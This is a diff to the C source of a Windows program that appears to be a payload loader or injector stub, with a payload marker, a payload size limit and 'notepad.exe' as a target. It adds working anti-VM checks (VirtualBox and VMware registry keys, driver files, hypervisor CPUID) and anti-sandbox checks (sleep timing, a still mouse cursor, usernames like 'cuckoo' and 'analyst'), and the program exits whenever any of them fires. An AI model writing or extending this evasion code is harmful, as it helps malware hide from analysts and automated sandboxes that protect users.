@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <intrin.h>
 
 #define PAYLOAD_MARKER 0xDEADBEEF
 #define MAX_PAYLOAD_SIZE 8192
@@ -51,6 +52,12 @@ typedef struct {
 	unsigned char check_debug_object;
 	unsigned char check_hardware_breakpoints;
 	unsigned char check_remote_debugger;
+	unsigned char check_vm_registry;
+	unsigned char check_vm_files;
+	unsigned char check_vm_cpuid;
+	unsigned char check_sleep_acceleration;
+	unsigned char check_mouse_movement;
+	unsigned char check_username;
 } PatchData;
 #pragma pack(pop)
 
@@ -64,6 +71,12 @@ PatchData patch_data = {
 	{0},
 	0,
 	"notepad.exe",
+	0,
+	0,
+	0,
+	0,
+	0,
+	0,
 	0,
 	0,
 	0,
@@ -243,6 +256,144 @@ BOOL perform_anti_debug_checks() {
 		return TRUE;
 	}
 	if (patch_data.check_remote_debugger && check_remote_debugger_present()) {
+		return TRUE;
+	}
+	return FALSE;
+}
+
+BOOL check_vm_registry() {
+	HKEY hKey;
+	const CHAR* vm_keys[] = {
+		"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
+		"SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
+		"SYSTEM\\CurrentControlSet\\Services\\VBoxService",
+		"SYSTEM\\CurrentControlSet\\Services\\VMTools",
+		"SYSTEM\\CurrentControlSet\\Services\\VMMOUSE",
+		"SYSTEM\\CurrentControlSet\\Services\\vmci",
+		"SYSTEM\\CurrentControlSet\\Services\\vmhgfs"
+	};
+	DWORD i;
+	for (i = 0; i < 7; i++) {
+		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vm_keys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+			RegCloseKey(hKey);
+			return TRUE;
+		}
+	}
+	return FALSE;
+}
+
+BOOL check_vm_files() {
+	const CHAR* vm_files[] = {
+		"C:\\Windows\\System32\\drivers\\vboxguest.sys",
+		"C:\\Windows\\System32\\drivers\\vboxmouse.sys",
+		"C:\\Windows\\System32\\drivers\\vmhgfs.sys",
+		"C:\\Windows\\System32\\drivers\\vmmouse.sys",
+		"C:\\Windows\\System32\\vboxdisp.dll",
+		"C:\\Windows\\System32\\vboxhook.dll",
+		"C:\\Windows\\System32\\vboxogl.dll"
+	};
+	DWORD i;
+	for (i = 0; i < 7; i++) {
+		if (GetFileAttributesA(vm_files[i]) != INVALID_FILE_ATTRIBUTES) {
+			return TRUE;
+		}
+	}
+	return FALSE;
+}
+
+BOOL check_vm_cpuid() {
+	INT cpuInfo[4] = {0};
+	__cpuid(cpuInfo, 0x40000000);
+	if (cpuInfo[1] == 0x61774D56 || cpuInfo[1] == 0x4D566572 || cpuInfo[1] == 0x65726177) {
+		return TRUE;
+	}
+	return FALSE;
+}
+
+BOOL perform_anti_vm_checks() {
+	if (patch_data.check_vm_registry && check_vm_registry()) {
+		return TRUE;
+	}
+	if (patch_data.check_vm_files && check_vm_files()) {
+		return TRUE;
+	}
+	if (patch_data.check_vm_cpuid && check_vm_cpuid()) {
+		return TRUE;
+	}
+	return FALSE;
+}
+
+BOOL check_sleep_acceleration() {
+	DWORD start, elapsed;
+	start = GetTickCount();
+	Sleep(500);
+	elapsed = GetTickCount() - start;
+	if (elapsed < 450) {
+		return TRUE;
+	}
+	return FALSE;
+}
+
+BOOL check_mouse_movement() {
+	POINT pos1, pos2, pos3;
+	DWORD wait_time = 500 + (GetTickCount() % 1000);
+	GetCursorPos(&pos1);
+	Sleep(wait_time);
+	GetCursorPos(&pos2);
+	Sleep(wait_time);
+	GetCursorPos(&pos3);
+	if ((pos1.x == pos2.x && pos1.y == pos2.y) && (pos2.x == pos3.x && pos2.y == pos3.y)) {
+		return TRUE;
+	}
+	return FALSE;
+}
+
+BOOL check_username() {
+	CHAR username[256];
+	CHAR username_lower[256];
+	DWORD size = sizeof(username);
+	const CHAR* sandbox_names[] = {
+		"sandbox", "malware", "maltest", "virus", "sample", "cuckoo", "analyst", "vmware", "vbox"
+	};
+	DWORD i, j;
+
+	if (!GetUserNameA(username, &size)) {
+		return FALSE;
+	}
+
+	for (i = 0; i < lstrlenA(username); i++) {
+		username_lower[i] = (username[i] >= 'A' && username[i] <= 'Z') ? username[i] + 32 : username[i];
+	}
+	username_lower[i] = '\0';
+
+	for (i = 0; i < 9; i++) {
+		BOOL match = TRUE;
+		DWORD name_len = lstrlenA(sandbox_names[i]);
+		DWORD user_len = lstrlenA(username_lower);
+		if (user_len != name_len) {
+			continue;
+		}
+		for (j = 0; j < name_len; j++) {
+			if (username_lower[j] != sandbox_names[i][j]) {
+				match = FALSE;
+				break;
+			}
+		}
+		if (match) {
+			return TRUE;
+		}
+	}
+	return FALSE;
+}
+
+BOOL perform_anti_sandbox_checks() {
+	if (patch_data.check_sleep_acceleration && check_sleep_acceleration()) {
+		return TRUE;
+	}
+	if (patch_data.check_mouse_movement && check_mouse_movement()) {
+		return TRUE;
+	}
+	if (patch_data.check_username && check_username()) {
 		return TRUE;
 	}
 	return FALSE;
@@ -656,6 +807,14 @@ int main() {
 	}
 
 	if (perform_anti_debug_checks()) {
+		return 1;
+	}
+
+	if (perform_anti_vm_checks()) {
+		return 1;
+	}
+
+	if (perform_anti_sandbox_checks()) {
 		return 1;
 	}
 
